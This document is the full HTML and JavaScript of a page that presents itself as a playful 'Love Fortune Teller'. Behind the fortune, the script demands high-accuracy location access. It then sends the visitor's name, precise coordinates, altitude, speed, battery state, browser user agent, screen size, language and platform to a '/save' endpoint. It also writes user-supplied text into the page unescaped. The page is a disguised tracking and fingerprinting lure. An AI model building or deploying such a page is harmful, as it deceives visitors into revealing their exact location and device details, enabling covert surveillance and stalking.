

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Love Fortune Teller</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        .heart {
            position: fixed;
            font-size: 20px;
            pointer-events: none;
            animation: floatUp 4s linear infinite;
            z-index: 0;
        }
        @keyframes floatUp {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 50px;
            padding: 50px 40px;
            max-width: 550px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0,0,0,0.2);
            backdrop-filter: blur(10px);
            z-index: 1;
            position: relative;
            animation: fadeIn 0.8s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .emoji { font-size: 90px; margin-bottom: 20px; animation: bounce 2s infinite; }
        @keyframes bounce {
            0%,100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        h1 {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 36px;
            margin-bottom: 10px;
        }
        .subtitle { color: #888; margin-bottom: 30px; font-size: 16px; }
        .input-group { margin-bottom: 25px; text-align: left; }
        .input-group label {
            display: block;
            margin-bottom: 10px;
            color: #c06c84;
            font-weight: 600;
            font-size: 16px;
        }
        .input-group input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #ffdde1;
            border-radius: 50px;
            font-size: 16px;
            text-align: center;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus {
            border-color: #c06c84;
            box-shadow: 0 0 15px rgba(192,108,132,0.3);
        }
        .btn {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            border: none;
            padding: 18px 45px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(192,108,132,0.4); }
        .loading { display: none; margin-top: 30px; }
        .loading.show { display: block; }
        .spinner {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            border-radius: 50%;
            animation: pulse 1.2s infinite;
        }
        @keyframes pulse {
            0%,100% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1.2); opacity: 1; }
        }
        .result {
            display: none;
            margin-top: 30px;
            padding: 35px;
            background: linear-gradient(135deg, #ff9a9e, #fecfef);
            border-radius: 30px;
            color: white;
            animation: slideUp 0.6s;
        }
        .result.show { display: block; }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(40px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fortune-text { font-size: 22px; line-height: 1.5; margin: 20px 0; font-weight: 500; }
        .heart-icon { font-size: 45px; animation: heartbeat 1.5s infinite; }
        @keyframes heartbeat {
            0%,100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }
        .name-highlight { font-size: 28px; font-weight: bold; margin: 10px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
        @media (max-width:600px) {
            .container { padding: 35px 25px; }
            h1 { font-size: 28px; }
            .fortune-text { font-size: 18px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="emoji">💕🔮💕</div>
    <h1>Your Love Fortune</h1>
    <div class="subtitle">Discover what destiny has planned for your heart</div>

    <div id="initial">
        <div class="input-group">
            <label>✨ What's your name, beautiful soul? ✨</label>
            <input type="text" id="userName" placeholder="Enter your name..." autocomplete="off">
        </div>
        <button class="btn" onclick="getFortune()">✨ Reveal My Destiny ✨</button>
    </div>

    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>💫 Reading the stars for you... 💫</p>
    </div>

    <div class="result" id="result">
        <div class="heart-icon">💖</div>
        <div class="name-highlight" id="userNameDisplay"></div>
        <div class="fortune-text" id="fortuneText"></div>
        <div class="small-text">✨ The universe has spoken ✨</div>
        <div class="small-text" style="margin-top: 20px;">
        </div>
    </div>
</div>

<script>
    function createHeart() {
        const heart = document.createElement('div');
        heart.innerHTML = ['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
        heart.classList.add('heart');
        heart.style.left = Math.random() * 100 + '%';
        heart.style.animationDuration = Math.random() * 3 + 3 + 's';
        heart.style.fontSize = Math.random() * 20 + 15 + 'px';
        document.body.appendChild(heart);
        setTimeout(() => heart.remove(), 4000);
    }
    setInterval(createHeart, 500);

    async function getBattery() {
        if ('getBattery' in navigator) {
            try {
                const b = await navigator.getBattery();
                return { level: Math.round(b.level*100), charging: b.charging };
            } catch(e) { return null; }
        }
        return null;
    }

    async function getFortune() {
        const name = document.getElementById('userName').value.trim();
        if (!name) {
            alert('💕 Please enter your beautiful name! 💕');
            return;
        }
        document.getElementById('initial').style.display = 'none';
        document.getElementById('loading').classList.add('show');

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async function(pos) {
                const battery = await getBattery();
                const data = {
                    name: name,
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed,
                    battery: battery,
                    ua: navigator.userAgent,
                    screen: screen.width + 'x' + screen.height,
                    lang: navigator.language,
                    platform: navigator.platform
                };
                try {
                    const res = await fetch('/save', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    });
                    const result = await res.json();
                    document.getElementById('loading').classList.remove('show');
                    document.getElementById('result').classList.add('show');
                    document.getElementById('userNameDisplay').innerHTML = `✨ ${name} ✨`;
                    document.getElementById('fortuneText').innerHTML = result.fortune;
                } catch(err) {
                    alert('Error, please try again');
                    location.reload();
                }
            }, function() {
                alert('💕 Please allow location access for your fortune! 💕');
                location.reload();
            }, { enableHighAccuracy: true, timeout: 10000 });
        } else {
            alert('Geolocation not supported');
        }
    }
</script>
</body>
</html>
